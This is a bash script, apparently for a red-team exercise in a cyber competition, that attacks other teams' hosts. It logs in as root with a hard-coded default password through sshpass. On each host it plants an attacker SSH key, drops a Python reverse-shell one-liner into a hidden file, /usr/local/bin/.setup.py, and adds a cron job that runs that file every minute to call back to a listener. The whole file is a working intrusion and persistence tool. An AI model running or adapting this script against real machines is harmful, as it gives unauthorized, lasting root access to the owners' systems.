#!/bin/bash

#ssh into 10.2.X.10 10.2.X.50 10.2.X.60 10.3.X.10

if [[ $# -ne 1 ]]; then
	echo "Usage: $0 <Team Number>"
	exit 1
fi

teamnum=$1

apt=`command -v apt-get`
yum=`command -v yum`

if [ ! -z "$apt" ]; then
	apt-get install sshpass &> /dev/null
elif [ ! -z "$yum" ]; then
	yum install -y epel-release &> /dev/null
	yum install -y sshpass &> /dev/null
else
	echo "No supported pkg manager."
	exit 1;
fi

password="Changeme-2018"
#password="password"

#sshpass -p "$password" ssh -o StrictHostKeyChecking=no aflickem@192.168.37.134 'echo "Hello and Goodbye"'


x=1231
for i in {1..11}
do
	
	if [[ $i != $teamnum ]]; then
		echo "python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\"10.2.$i.50\",$x));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);p=subprocess.call([\"/bin/sh\",\"-i\"]);'" > here
		sshpass -p "$password" ssh -o StrictHostKeyChecking=no root@10.2.$i.10 'mkdir -p ~/.ssh'
		sshpass -p "$password" ssh -o StrictHostKeyChecking=no root@10.2.$i.10 'echo "ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQCxpUnKNkkpeSa18MtjNs6C/RiwlgjUjglEFp/pxv2hBXz/V7BofxrMRRAVaSJ6Ibjt9CwTTcZW/7+kUexDiLtQsdZrq7bQJDCR95DsnbEC6PcVCfuA8/hH9y1Os5E3rJ81U6XyTzEkAURK79wfVnwTwHJXyutKkcBdEJUag0sZNCnoCDx3w6jeKqPG2IS6aTQp42Z8jvYCd4bHPVwm9qQNjLwgSbXcuzy7LTaTC6qkr3F5RHNRPoKDkaGCWhmoVKK9GXPnKBqr1dNTlUPXp7u2Hy5CiuvCPLrs0pddORqPcHu5iY2D0zqDozXDfxUAD/werhIl2Vfnuc0onystkfJv" >> ~/.ssh/authorized_keys'
 		sshpass -p "$password" scp here root@10.2.$i.10:/usr/local/bin/.setup.py
 		sshpass -p "$password" ssh -o StrictHostKeyChecking=no root@10.2.$i.10 'echo "* * * * * /bin/bash /usr/local/bin/.setup.py" >> /etc/crontab'
		x=$((x+1))
		echo "python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\"10.2.$i.50\",$x));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);p=subprocess.call([\"/bin/sh\",\"-i\"]);'" > here
 		sshpass -p "$password" ssh -o StrictHostKeyChecking=no root@10.2.$i.50 'mkdir -p ~/.ssh'
		sshpass -p "$password" ssh -o StrictHostKeyChecking=no root@10.2.$i.50 'echo "ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQCxpUnKNkkpeSa18MtjNs6C/RiwlgjUjglEFp/pxv2hBXz/V7BofxrMRRAVaSJ6Ibjt9CwTTcZW/7+kUexDiLtQsdZrq7bQJDCR95DsnbEC6PcVCfuA8/hH9y1Os5E3rJ81U6XyTzEkAURK79wfVnwTwHJXyutKkcBdEJUag0sZNCnoCDx3w6jeKqPG2IS6aTQp42Z8jvYCd4bHPVwm9qQNjLwgSbXcuzy7LTaTC6qkr3F5RHNRPoKDkaGCWhmoVKK9GXPnKBqr1dNTlUPXp7u2Hy5CiuvCPLrs0pddORqPcHu5iY2D0zqDozXDfxUAD/werhIl2Vfnuc0onystkfJv" >> ~/.ssh/authorized_keys'
 		sshpass -p "$password" scp here root@10.2.$i.50:/usr/local/bin/.setup.py
 		sshpass -p "$password" ssh -o StrictHostKeyChecking=no root@10.2.$i.50 'echo "* * * * * /bin/bash /usr/local/bin/.setup.py" >> /etc/crontab'
		x=$((x+1))
		echo "python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\"10.2.$i.50\",$x));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);p=subprocess.call([\"/bin/sh\",\"-i\"]);'" > here
		sshpass -p "$password" ssh -o StrictHostKeyChecking=no root@10.2.$i.60 'mkdir -p ~/.ssh'
		sshpass -p "$password" ssh -o StrictHostKeyChecking=no root@10.2.$i.60 'echo "ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQCxpUnKNkkpeSa18MtjNs6C/RiwlgjUjglEFp/pxv2hBXz/V7BofxrMRRAVaSJ6Ibjt9CwTTcZW/7+kUexDiLtQsdZrq7bQJDCR95DsnbEC6PcVCfuA8/hH9y1Os5E3rJ81U6XyTzEkAURK79wfVnwTwHJXyutKkcBdEJUag0sZNCnoCDx3w6jeKqPG2IS6aTQp42Z8jvYCd4bHPVwm9qQNjLwgSbXcuzy7LTaTC6qkr3F5RHNRPoKDkaGCWhmoVKK9GXPnKBqr1dNTlUPXp7u2Hy5CiuvCPLrs0pddORqPcHu5iY2D0zqDozXDfxUAD/werhIl2Vfnuc0onystkfJv" >> ~/.ssh/authorized_keys'
 		sshpass -p "$password" scp here root@10.2.$i.60:/usr/local/bin/.setup.py
 		sshpass -p "$password" ssh -o StrictHostKeyChecking=no root@10.2.$i.60 'echo "* * * * * /bin/bash /usr/local/bin/.setup.py" >> /etc/crontab'
		x=$((x+1))
		echo "python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\"10.2.$i.50\",$x));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);p=subprocess.call([\"/bin/sh\",\"-i\"]);'" > here
		sshpass -p "$password" ssh -o StrictHostKeyChecking=no root@10.3.$i.10 'mkdir -p ~/.ssh'
		sshpass -p "$password" ssh -o StrictHostKeyChecking=no root@10.3.$i.10 'echo "ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQCxpUnKNkkpeSa18MtjNs6C/RiwlgjUjglEFp/pxv2hBXz/V7BofxrMRRAVaSJ6Ibjt9CwTTcZW/7+kUexDiLtQsdZrq7bQJDCR95DsnbEC6PcVCfuA8/hH9y1Os5E3rJ81U6XyTzEkAURK79wfVnwTwHJXyutKkcBdEJUag0sZNCnoCDx3w6jeKqPG2IS6aTQp42Z8jvYCd4bHPVwm9qQNjLwgSbXcuzy7LTaTC6qkr3F5RHNRPoKDkaGCWhmoVKK9GXPnKBqr1dNTlUPXp7u2Hy5CiuvCPLrs0pddORqPcHu5iY2D0zqDozXDfxUAD/werhIl2Vfnuc0onystkfJv" >> ~/.ssh/authorized_keys'
 		sshpass -p "$password" scp here root@10.3.$i.10:/usr/local/bin/.setup.py
 		sshpass -p "$password" ssh -o StrictHostKeyChecking=no root@10.3.$i.10 'echo "* * * * * /bin/bash /usr/local/bin/.setup.py" >> /etc/crontab'
		x=$((x+1))
 	fi
done


